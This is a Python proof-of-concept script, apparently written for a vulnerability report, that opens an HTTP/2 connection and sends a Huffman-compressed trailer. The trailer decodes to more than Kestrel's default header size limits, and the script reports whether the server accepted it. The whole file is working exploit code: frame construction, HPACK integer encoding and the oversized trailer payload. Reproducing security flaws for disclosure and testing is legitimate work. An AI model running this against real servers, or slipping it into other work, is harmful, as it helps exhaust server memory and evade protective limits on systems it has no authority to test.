#!/usr/bin/env python3
"""Prove decompressed HTTP/2 trailers bypass Kestrel's default header limits."""

from __future__ import annotations

import select
import socket
import time

from repro import (
    FLAG_ACK,
    FLAG_END_HEADERS,
    FLAG_END_STREAM,
    FRAME_CONTINUATION,
    FRAME_DATA,
    FRAME_HEADERS,
    FRAME_SETTINGS,
    HOST,
    PORT,
    PREFACE,
    frame,
    recv_frame,
    request_headers,
)


MAX_FIELD = 32 * 1024
DECODED_LENGTH = 52_428


def encode_integer(value: int, prefix_bits: int, first_byte: int) -> bytes:
    prefix_max = (1 << prefix_bits) - 1
    if value < prefix_max:
        return bytes((first_byte | value,))

    encoded = bytearray((first_byte | prefix_max,))
    value -= prefix_max
    while value >= 128:
        encoded.append((value & 0x7F) | 0x80)
        value >>= 7
    encoded.append(value)
    return bytes(encoded)


def oversized_huffman_trailer() -> bytes:
    name = b"x-limit-probe"

    # RFC 7541 gives ASCII '0' the five-bit Huffman code 00000. The decoded
    # length below therefore occupies exactly 32,768 encoded bytes; four one
    # bits provide the required EOS-prefix padding in the last byte.
    encoded_value = (b"\x00" * (MAX_FIELD - 1)) + b"\x0f"
    assert DECODED_LENGTH * 5 == (len(encoded_value) * 8) - 4

    return (
        b"\x00"
        + encode_integer(len(name), 7, 0)
        + name
        + encode_integer(len(encoded_value), 7, 0x80)
        + encoded_value
    )


def connect() -> socket.socket:
    sock = socket.create_connection((HOST, PORT), timeout=3)
    sock.sendall(PREFACE + frame(FRAME_SETTINGS, 0, 0))
    while True:
        frame_type, flags, _stream_id, _payload = recv_frame(sock)
        if frame_type == FRAME_SETTINGS and not flags & FLAG_ACK:
            sock.sendall(frame(FRAME_SETTINGS, FLAG_ACK, 0))
            return sock


def send_header_block(sock: socket.socket, block: bytes, *, trailers: bool) -> None:
    chunks = [block[offset : offset + 16_384] for offset in range(0, len(block), 16_384)]
    first_flags = FLAG_END_STREAM if trailers else 0
    if len(chunks) == 1:
        first_flags |= FLAG_END_HEADERS
    sock.sendall(frame(FRAME_HEADERS, first_flags, 1, chunks[0]))

    for index, chunk in enumerate(chunks[1:], start=1):
        flags = FLAG_END_HEADERS if index == len(chunks) - 1 else 0
        sock.sendall(frame(FRAME_CONTINUATION, flags, 1, chunk))


def main() -> int:
    sock = connect()
    send_header_block(sock, request_headers(), trailers=False)
    trailer_block = oversized_huffman_trailer()
    send_header_block(sock, trailer_block, trailers=True)

    response_body = bytearray()
    frame_log = []
    deadline = time.monotonic() + 5
    while time.monotonic() < deadline:
        readable, _, _ = select.select([sock], [], [], deadline - time.monotonic())
        if not readable:
            break
        item = recv_frame(sock)
        frame_log.append((item[0], item[1], item[2], len(item[3])))
        if item[0] == FRAME_DATA:
            response_body.extend(item[3])
            if item[1] & FLAG_END_STREAM:
                break

    text = response_body.decode("ascii", "replace")
    passed = f"trailer={DECODED_LENGTH}" in text
    print(f"compressed_value_length={MAX_FIELD}")
    print(f"decoded_value_length={DECODED_LENGTH}")
    print(f"default_MaxRequestHeaderFieldSize={MAX_FIELD}")
    print(f"default_MaxRequestHeadersTotalSize={MAX_FIELD}")
    print(f"response_frames={frame_log}")
    print(f"application_response={text.strip()!r}")
    print(f"limits_bypassed={passed}")
    sock.close()
    return 0 if passed else 1


if __name__ == "__main__":
    raise SystemExit(main())
